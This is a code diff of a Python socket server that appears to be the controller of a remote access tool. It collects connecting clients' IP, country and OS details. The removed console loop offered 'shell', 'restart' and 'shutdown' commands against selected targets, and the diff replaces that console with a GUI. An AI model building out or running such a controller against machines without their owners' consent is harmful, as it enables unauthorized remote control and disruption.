@@ -1,8 +1,7 @@
 import socket
 import threading
-from server_folder.tools import Menu  # Delete when GUI is added
-import server_folder.config as config
-from server_folder.Modules import shell as Shell, power as Power
+import config
+from gui import start as start_gui
 
 
 class Server:
@@ -48,17 +47,7 @@ class Server:
             chunk = sock.recv(config.BUFFER_SIZE)
             if chunk != '.'.encode():
                 data += chunk
-        return data if as_bytes else data.decode()
-
-
-def print_logo():
-    print('          ____                \n'
-          '   ___   / ___|   _   _   ___ \n'
-          '  / _ \  \___ \  | | | | / __|\n'
-          ' | (_) |  ___) | | |_| | \__ \\\n'
-          '  \___/  |____/   \__, | |___/\n'
-          '                  |___/       \n'
-          'Made by: Asaf and Rohy\n\nEnter your command:')
+        return data if as_bytes else data.decode(errors="ignore")
 
 
 def client_connections(server):
@@ -72,58 +61,23 @@ def client_connections(server):
             print('\n[+] New connection from: ', addr[0])
             client_data = server.receive(client_socket).split(',')  # IP,CountryCode,Name,Os
             print({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
-
             # Add new client to the clients list
             exist = False
-            for client in config.all_connections:
+            for client in config.client_list:
                 if client['ip'] == addr[0]:
                     exist = True
                     break
             if not exist:
-                config.all_connections.append({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
-    except socket.error:
+                config.client_list.append({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
+    except socket.error as e:
+        print(e)
         client_connections(server)
 
 
-def get_targets():
-    """Wip would be connected to the GUI"""
-    return [0]
-
-
 def main():
-    print_logo()
     server = Server('localhost', 8000)
-    menu = Menu(server)  # Delete after GUI
     threading.Thread(target=client_connections, args=(server,)).start()  # Thread to accept new connections
-    while True:
-        user_input = input(config.custom_console).split()
-        cmd = user_input[0] if len(user_input) > 0 else ''  # Get raw command
-        args = user_input[1] if len(user_input) > 1 else ''  # Get raw argument
-
-        try:
-            if cmd == 'menu' or cmd.lower() == 'help':
-                menu.help()
-            elif cmd == 'list':
-                menu.refresh_client_list()
-            elif cmd == 'select':
-                menu.select(int(args))
-            elif cmd == 'quit':
-                menu.quit()
-            elif cmd == 'kill':
-                menu.kill()
-            # -------------------------
-            elif cmd == 'shell':
-                Shell.shell(server, get_targets())
-            elif cmd == 'restart':
-                Power.restart(server, get_targets())
-            elif cmd == 'shutdown':
-                Power.shutdown(server, get_targets())
-            elif cmd == '':
-                print('\n')
-            else:
-                print('[!] Invalid command.\n')
-        except Exception as e:
-            print(e)
+    start_gui(server)
 
 
 if __name__ == "__main__":
